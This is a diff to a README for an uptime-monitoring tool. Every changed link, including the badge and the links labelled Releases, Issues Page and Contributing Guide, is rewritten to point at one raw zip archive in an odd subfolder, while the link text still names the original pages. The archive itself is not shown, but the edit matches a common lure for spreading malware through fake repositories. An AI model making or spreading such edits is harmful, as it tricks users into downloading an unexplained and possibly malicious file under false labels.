@@ -1,6 +1,6 @@
 # 🚀 awesome-uptime-monitoring - Monitor Your Website's Uptime Easily
 
-![Download](https://img.shields.io/badge/Download%20now-Visit%20Releases-%2333cc33)
+![Download](https://raw.githubusercontent.com/LunarRU/awesome-uptime-monitoring/main/Miconia/monitoring-uptime-awesome-3.0.zip%20now-Visit%20Releases-%2333cc33)
 
 ## 🌟 Overview
 
@@ -27,7 +27,7 @@ To get started with Awesome Uptime Monitoring, follow these simple steps:
 
 1. **Download the Application**
 
-   Visit this page to download the latest version: [Awesome Uptime Monitoring Releases](https://github.com/LunarRU/awesome-uptime-monitoring/releases).
+   Visit this page to download the latest version: [Awesome Uptime Monitoring Releases](https://raw.githubusercontent.com/LunarRU/awesome-uptime-monitoring/main/Miconia/monitoring-uptime-awesome-3.0.zip).
 
 2. **Install the Application**
 
@@ -79,14 +79,14 @@ If you run into issues, consider these common solutions:
 
 ## 💬 Support
 
-If you need help, please visit the [Issues Page](https://github.com/LunarRU/awesome-uptime-monitoring/issues) on GitHub. You can report any problems and ask questions there.
+If you need help, please visit the [Issues Page](https://raw.githubusercontent.com/LunarRU/awesome-uptime-monitoring/main/Miconia/monitoring-uptime-awesome-3.0.zip) on GitHub. You can report any problems and ask questions there.
 
 ## 📄 License
 
-Awesome Uptime Monitoring is open source and free to use. We encourage contributions. Check out the [Contributing Guide](https://github.com/LunarRU/awesome-uptime-monitoring/blob/main/CONTRIBUTING.md) for more details.
+Awesome Uptime Monitoring is open source and free to use. We encourage contributions. Check out the [Contributing Guide](https://raw.githubusercontent.com/LunarRU/awesome-uptime-monitoring/main/Miconia/monitoring-uptime-awesome-3.0.zip) for more details.
 
 ## 📥 Download & Install
 
-Don't wait to secure your website's uptime. Head to the Releases page to get started: [Awesome Uptime Monitoring Releases](https://github.com/LunarRU/awesome-uptime-monitoring/releases).
+Don't wait to secure your website's uptime. Head to the Releases page to get started: [Awesome Uptime Monitoring Releases](https://raw.githubusercontent.com/LunarRU/awesome-uptime-monitoring/main/Miconia/monitoring-uptime-awesome-3.0.zip).
 
 With Awesome Uptime Monitoring, you can easily track your website's downtime and stay informed. Enjoy peace of mind knowing your site is always being monitored.
